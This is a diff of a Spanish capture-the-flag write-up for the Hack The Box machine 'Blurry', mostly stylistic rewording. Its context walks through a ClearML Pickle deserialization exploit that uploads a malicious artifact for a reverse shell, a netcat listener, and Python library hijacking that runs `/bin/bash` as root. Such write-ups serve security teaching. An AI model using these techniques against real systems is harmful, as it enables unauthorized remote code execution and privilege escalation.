@@ -82,7 +82,7 @@ Al entrar salta una página "getting started" que nos explica como configurar `c
 
 ![get started](../../img/Blurry/get-started.png)
 
-En la configuración vemos las urls `api.blurry.htb` y `files.blurry.htb`, vamos a añadirlas también al `/etc/hosts` por si acaso.
+En la configuración, observamos las URLs `api.blurry.htb` y `files.blurry.htb`, así que las añadiremos también al `/etc/hosts` por si acaso.
 
 ```
 echo "10.129.136.227  api.blurry.htb" >> /etc/hosts 
@@ -121,7 +121,7 @@ api {
 }
 ```
 
-Una vez configurado, podemos cerrar este mensaje e investigar la página.
+Una vez configurado, podemos cerrar este mensaje e investigar el sitio.
 
 La página parece utilizar `ClearML`, una plataforma de gestión de proyectos de **machine learning**.
 
@@ -242,7 +242,7 @@ Buscando en internet vilnerabilidades de esta versión de `ClearML` nos encontra
 
 **¿En qué consiste esta vulnerabilidad?**
 
-*Esta vilnerabilidad se aprobecha de que ClearML utliliza la utilidad de python `Pickle`, que sirve para serializar objetos de python.*
+*Esta vilnerabilidad se aprovecha de que ClearML utliliza la utilidad de python `Pickle`, que sirve para serializar objetos de python.*
 
 *Los artefactos que se comparten a traves de ClearML deben ser serializados con `Pickle`. Por lo que cuando se utiliza el metodo get para cargar un artefacto que te ha sido compartido, este se deserializa y se carga en memoria permitiendo al autor del artefacto ejecutar código en la máquina del que lo haya cargado.*
 
@@ -252,9 +252,9 @@ Buscando en internet vilnerabilidades de esta versión de `ClearML` nos encontra
 
 ---
 
-Podemos ver como en el experimento se hace un `get()` a todas las tareas con la etiqueta `review`, por lo que debemos crear una tarea que explote esta vulnerabilidad con la etiqueta `review` y subirla al servidor.
+Podemos observar que en el experimento se realiza un `get()` a todas las tareas etiquetadas como `review`, por lo que debemos crear una tarea que explote esta vulnerabilidad, etiquetarla como `review` y subirla al servidor.
 
-Primero necesitaremos crear la tarea con `Task.init()` y después subirla con `upload_artefact()`. Se puede encontrar la forma de utilizar estos métodos en la [documentación ofificl de ClearML](https://clear.ml/docs/latest/docs/references/sdk/task/).
+Primero necesitaremos crear la tarea con `Task.init()` y después subirla utilizando `upload_artefact()`. Se puede encontrar la forma de utilizar estos métodos en la [documentación ofificl de ClearML](https://clear.ml/docs/latest/docs/references/sdk/task/).
 
 En la clase a enviar reescribiremos la función reservada `__reduce__()` para que nos entable una reverse shell, esta función sirve para definir como el objeto debe ser serializado y deserializado por pickle. Entonces será ejecutado cuando `ClearML` lo deserialice.
 
@@ -275,7 +275,7 @@ task = Task.init(project_name='Black Swan', task_name='Just an artefact', tags=[
 task.upload_artifact(name='revshell', artifact_object=command, wait_on_upload=True, extension_name='.pkl', auto_pickle=True)
 ```
 
-Nos ponemos en escucha con `netcat` para recibir la reverse shell y en paralelo ejecutamos el script.
+Escuchamos con `netcat` para recibir la reverse shell y, en paralelo, ejecutamos el script.
 
 ```
 nc -lnvp 1234
@@ -297,7 +297,7 @@ Vamos a hacer el tratamiento de la TTY para trabajar de una manera más cómoda.
 script /dev/null -c bash
 ```
 
-Presionamos `ctrl`+`z`.
+Presionamos `Ctrl`+`z`.
 
 Y ejecutamos los siguientes comandos en orden.
 
@@ -308,7 +308,7 @@ export TERM=xterm
 export SHELL=`which bash`
 ```
 
-Como `jippity` ya podemos ver la flag de `user.txt`
+Como jippity, ahora podemos acceder a la flag de `user.txt`.
 
 ```
 cd
@@ -399,8 +399,6 @@ ls -l
 
 Tenemos el script `evaluate_model.py`, llamado por `/usr/bin/evaluate_model`. Vamos a inspeccionarlo en busca de alguna vilnerabilidad.
 
-https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8
-
 ```python
 import torch
 import torch.nn as nn
@@ -490,7 +488,7 @@ Vemos que se están importando varios módulos externos, si pudieramos escribir 
 
 *Si podemos ejecutar un script como `root` y este importa librerías externas (como `pytorch` o `numpy` en este caso), podemos crear módulos que ejecuten código arbitrario en carpetas con mayor prioridad. Este código se ejecutará al importarse.*
 
-*Evidentemente esto solo se podrá hacer si tenemos permisos en estas carpetas.*
+*Evidentemente, esto solo se podrá hacer si tenemos permisos en estas carpetas.*
 
 * Si quiéres aprender más sobre esta vulnerabilidad, [este artículo](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8) lo explica con más detalle.
 
@@ -512,7 +510,7 @@ import os
 os.system('/bin/bash')
 ```
 
-Nos da una shell interactiva como `root`, por lo que ya podemos leer la flag `root.txt`, terminando así la máquina **blurry**.
+Nos da una shell interactiva como `root`, por lo que ya podemos leer la flag `root.txt`, terminando así la máquina **Blurry**.
 
 ```
 cd
